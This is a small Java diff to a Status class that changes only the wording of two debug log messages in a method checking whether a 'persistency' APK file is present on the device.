@@ -1091,12 +1091,12 @@ public class Status {
 		AutoFile apkFile = new AutoFile(persistencyApk);
 		if (apkFile.exists()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (persistencyReady) apk already there" + persistencyApk);
+				Check.log(TAG + " (persistencyReady) apk already there: " + persistencyApk);
 			}
 			return true;
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there" + persistencyApk);
+			Check.log(TAG + " (persistencyReady) apk NOT PRESENT there: " + persistencyApk);
 		}
 		return false;
 	}
